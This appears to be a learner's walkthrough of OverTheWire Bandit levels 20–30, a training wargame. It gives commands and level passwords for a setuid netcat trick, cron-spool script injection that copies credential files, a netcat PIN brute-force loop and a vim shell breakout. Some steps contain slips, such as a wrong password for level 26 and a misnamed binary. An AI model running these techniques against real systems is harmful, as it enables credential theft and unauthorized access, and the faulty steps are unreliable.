https://overthewire.org/wargames/bandit/

---
## level 20 ---> level 21

**Level Goal:**
There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
>**NOTE:** Try connecting to your own network daemon to see if it works as you think

**Solution:**
- `ssh bandit20@51.20.162.29 -p 2220`  : password is `4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA`
- `tmux` : enter to terminal multiplixer
- presss Ctrl+b and release  and type `"` it split into two panels. 
- In bottom  panel, `echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -l 2040` : it start listing to port 2040 and if anything connects it sends password in echo.
- **leave the command running** and press Ctrl+b and release and press upper arrow, it moves to top panel.
- In top panel, `./suconnect 2040`
- Now here basically `./suconnect` connect to 2040 port and check for any data comming, if comming matches with bandit20 password. If true send bandti21 password. 
- Now look at the bottom panel where we listning to port 2040 : we got password to next level `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY`

---
## level 21 ---> level 22

**Level Goal:**
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**Solution:**
- `ssh bandit21@51.20.162.29 -p 2220` : password is `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY`
- `cd /etc/cron.d/` : go to required directory .
- `ls -l` : we can see multiple cronjob file but we going through *cronjob_bandit22*.
- `cat cronjob_bandit22` : lets see what job this file doing and finded out it executing `/usr/bin/cronjob_bandit22.sh` script as a user bandit22 and sending all output and error both (&>) to black hole. In every minute or when reboot.
- `cat /usr/bin/cronjob_bandit22.sh` : lets see what inside this script, and finded out its sending user bandit22 password to `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`.
- `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` : got password `RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz`

---
## level 22 ---> level 23

**Level Goal:**
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**Solution:**
- `ssh bandit22@51.20.162.29 -p 2220` : password is `RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz`
- `cd /etc/cron.d/` : go to required directory .
- `ls -l` : we can see multiple cronjob file but we going through *cronjob_bandit23*.
- `cat cronjob_bandit23` : lets see what job this file doing and finded out it executing `/usr/bin/cronjob_bandit23.sh` script as a user bandit23 and sending all output and error both (&>) to black hole. In every minute or when reboot.
- `cat /usr/bin/cronjob_bandit23.sh` : lets see what inside this script, and finded out its sending user bandit23 password to `/tmp/$mytarget`. and also `$mytarget` is `(echo I am user $myname | md5sum | cut -d ' ' -f 1)`. And also `$myname` is `whoami`. So `$myname` becomes `bandit23` because cronjob is runnig this script as bandit23 user.
- `echo I am user bandit23 | md5sum | cut -d ' ' -f 1` : Lets execute script and see what is `$mytarget`. And it is `8ca319486bfbbc3663ea0fbe81326349`. Here `md5sum` converts `I am user banidt 23` to MD5 Hash and give output of hash and file() in row sif provided or `-` seperated by space and  cut grab md5 hash only (-d means delemeter or seperator and -f means field or column).  
- `cat /tmp/8ca319486bfbbc3663ea0fbe81326349` : got password `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`

---
## level 23 ---> level 24

**Level Goal:**
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
>**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
>**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

**Note:** 
**`stat`** : A command gives  details about file. and `--format "%U"` only pring user of file. `stat --format "%U" "<filename>"`
**`timeout`**: A command used to run another program with a strict time limit. Eg `timeout -s 9 60` Sets the time limit to 60 seconds and  `-s 9`: If the script is still running after 60 seconds, send **Signal 9 (SIGKILL)**.
`shopt -s nullglob` **(shell option -s nullglob)**: When using wildcard `*` like `*.sh` in loop if directory is empty bash treats `*.sh` as actual file name. That why `nullglob` is used to tell bash that if wildcard doesnot find anything, convert it into **null string**.

**Solution:**
- `ssh bandit23@51.20.162.29 -p 2220` : password is `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`
- `cd /etc/cron.d/` : go to required directory .
- `ls -l` : we can see multiple cronjob file but we going through *cronjob_bandit24*.
- `cat cronjob_bandit24` : lets see what job this file doing and finded out it executing `/usr/bin/cronjob_bandit24.sh` script as a user bandit24 and sending all output and error both (&>) to black hole. In every minute or when reboot.
- `cat /usr/bin/cronjob_bandit24.sh` : lets see what inside this script, and finded out its executing(no longer takes 60s in execution) and deleting every file own by bandit23 in /var/spool/bandit24/foo directory.
- `cd /var/spool/bandit24 && ls -l` :  Its shows that we can write and execute in `foo` directory. That means we are creating script that send bandit24 password from `/etc/bandit_pass/bandit24` to `/tmp/scriptdirnabin/password`
- `mkdir /tmp/scriptdirnabin` : create directory 
- `touch /tmp/scriptdirnabin/password` :  create file 
- `chmod 777 /tmp/scriptdirnabin/password /tmp/scriptdirnabin` : provide required permissions
- `cd foo` : go to foo directory 
- `nano bandit24pass.sh` : create file and add this script 
``` shell
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/scriptdirnabin/password
```
- `chmod 777 bandit24pass.sh` : give the file permission to execute.
- Then wait for a minute, because `cronjobbandit24` is executing in every minute.
- `cat /tmp/scriptdirnabin/password` : got password `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`

---
## level 24 ---> level 25

**Level Goal:**
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time.

**Solution:**
- `ssh bandit24@51.20.162.29 -p 2220` : password is `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`
- `mktemp -d` : create directory `/tmp/tmp.QNhbbAXGls`
- `cd /tmp/tmp.QNhbbAXGls` : go to directory
- `nano script.sh` : create file  and add this script
```shell
#!/bin/bash
for i in {0000..9999}; do
	echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"
done | nc 127.0.0.1 30002
```
Here the pipe operator send the entire output generate by for loop in single connection of given command nc.
- `chmod 700 script.sh` : giving executable permission.
- `./script.sh` : got password `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`

---
## level 25 ---> level 26

**Level Goal:**
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.
> NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

**Note:** 
`more` command is to view large file(which do not fit in terminal) in systemetic way in terminal and it has command `v` which leads us to view file in `vim`.
`Vim` allow us to run some shell commands also . we can use command after typing `:` in vim.
In vim to spawn the user\`s default shell, the `:shell` command is used. And we can change shell to `/bin/bash`  using `:set shell=/bin/sh`. 

**Solution:**
- `ssh bandit25@51.20.162.29 -p 2220` : password is `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`
- `cat /etc/passwd | grep bandit26` : Finded out bandit26 using `/usr/bin/showtext` shell.
- `cat /usr/bin/showtext` :  Lets see what it is doing, 
```shell
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```
This shell  view text.txt file using `more` command and exit the shell.
- `ls` : got `bandit26.sshkey`  private ssh key of bandit26
- Back to our machine, 
- `scp -P 2220 bandit25@51.20.162.29:~/bandit26.sshkey .` download sshkey.
- `ssh -i bandit26.sshkey bandit26@51.20.162.29 -p 2220` : Says connection closed. Why this happens is when we get shell, text inside `text.txt` is small so that `more` do not have to open because it fit in terminal. And exit the shell. For `more` to work we need to make our terminal size small so that more opens and  we can resize our terminal to normal.
- `v` : press `v` to open vim.
- `:set shell=/bin/sh` : set /bin/sh shell to bandit26 
- `:shell` : for open shell, now we are into /bin/sh shell of bandit 26 user.
- `cat /etc/bandit_pass/bandit26` : got password `jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ`.

---
## level 26 ---> level 27

**Level Goal:**
Good job getting a shell! Now hurry and grab the password for bandit27!

**Solution:**
- Make terminal small.
- `ssh bandit26@51.20.162.29 -p 2220` : password is `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY`
- Now resize terminal to normal. We get `more` running. If not work make terminal too small and try again.
- Press `v`, got vim now type `:set shell=/bin/bash` enter and type `:shell`. Now got bandit26 shell.
- `ls` : we can see `bandit27-do` file.
- `file bandit27-do` : it\`s a setuid flag file of bandit27 user.
- `./bandit27 cat /etc/bandit_pass/bandit27` : got password `STJLJBRRphMxKB392CT4iOr5CbzPU9ER`.

---
## level 27 ---> level 28

**Level Goal:**
There is a git repository at `ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo` via the port `2220`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

**Solution:**
- `git clone ssh://bandit27-git@51.20.162.29:2220/home/bandit27-git/repo` :  password is `STJLJBRRphMxKB392CT4iOr5CbzPU9ER`.
- It download `repo` directory to our machine.
- `cd repo && ls`: change and list directory got `README` file.
- `cat README` : got password `y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ`.

---
## level 28 ---> level 29

**Level Goal:**
There is a git repository at `ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo` via the port `2220`. The password for the user `bandit28-git` is the same as for the user `bandit28`.
From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

**Solution:**
- `git clone ssh://bandit28-git@51.20.162.29:2220/home/bandit28-git/repo` :  password is `y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ`.
- It download `repo` directory to our machine.
- `cd repo && ls`: change and list directory got `README.md` file.
- `cat README.md` : Here password is not add it show xxxxxx .
- Lets see pervious commit `git log -p README.md`
- Got password in pervious commit : `Em7eGtqaMySwNFjCpwzzHhLhospOcdt0`.

---
## level 29 ---> level 30

**Level Goal:**
There is a git repository at `ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo` via the port `2220`. The password for the user `bandit29-git` is the same as for the user `bandit29`.
From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

**Solution:**
- `git clone ssh://bandit29-git@51.20.162.29:2220/home/bandit29-git/repo` :  password is `Em7eGtqaMySwNFjCpwzzHhLhospOcdt0`.
- It download `repo` directory to our machine.
- `cd repo && ls`: change and list directory got `README.md` file.
- `cat README.md` : Here password is not add Says password is not in production.
- Lets see pervious commit `git log -p README.md` : Also not get any password in pervious commit. 
-  lets see for other branch `git branch -a` : Yes there are also other branch lets check `dev` branch.
- `git checkout dev` : Change branch
- `cat README.md` : got password `jq9Dfg2rXsfYsWMgFuKlXhphjdH7USgX`.

---
[[Wargames(Bandit 11-20)]]
